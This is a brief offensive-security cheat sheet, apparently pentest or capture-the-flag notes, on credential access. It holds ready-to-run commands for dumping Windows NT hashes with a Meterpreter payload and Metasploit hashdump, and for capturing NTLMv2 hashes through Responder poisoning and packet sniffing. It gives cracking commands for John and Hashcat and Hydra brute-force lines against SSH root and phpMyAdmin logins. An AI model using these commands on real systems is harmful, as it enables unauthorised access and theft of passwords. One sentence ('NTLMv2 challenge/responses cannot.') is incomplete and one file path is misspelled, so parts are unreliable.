# Credential Access

## NTLMv1
SAM and NTDS.dit files contain unsalted NT hashes and are used in NTLMv1 challenge/responses. These hashes can be cracked or used in Pass-the-Hash attacks.

### Metasploit, MSFVenom, Meterpreter, and John
```bash
# setup a handler using Metasploit
# create a Meterpreter-based payload using MSFVenom
# get the target to download and execute the payload
# configure and run the post/windows/gather/hashdump exploit in Metasploit
vim hash.txt # save hash dump to a file
john --format=nt hash.txt # crack the hash
john --format=nt --show hash.txt      # show the password
```

## NTLMv2
NTLMv2 challenge/responses cannot. 

### Responder and John
```bash
sudo Responder.py -I eth0 
# wait for Responder to reply to a LLMNR request 
# then, check Responder's log directory for the NTLMv2 hash obtained 
cat responder/logs/SMB-NTLMv2-SSP-*.txt
john --format=netntlmv2 responder/logs/SMB-NTLMv2-SSP-*.txt # crack the hash
john --show responder/logs/SMB-NTLMv2-SSP*.txt              # show the password
```

### Tcpdump, Pcredz, and Hashcat
```bash
sudo tcpdump -ni eth0 port 445 -w /tmp/traffic.pcap
# wait for someone to auth via SMB to a Windows machine
sudo Pcredz -vf traffic.pcap
# use /tmp to avoid a segmentation fault
# check Pcredz's log directory for the NTLMv2 hash obtained
cat pcredz/logs/NTLMv2.txt
hashcat -a0 -m5600 -w3 pcredz/logs/NLTMV2.txt                   # crack the hash
hashcat -m5600 pcredz/logs/NTLMv2.txt --show --outfile-format 2 # show the password
```

## SSH
### Hydra
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t4 ssh
```

## HTTP
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET \
  http-post-form "/phpmyadmin/index.php?:pma_username=^USER^&pma_password=^PASS^:Cannot|without"
```
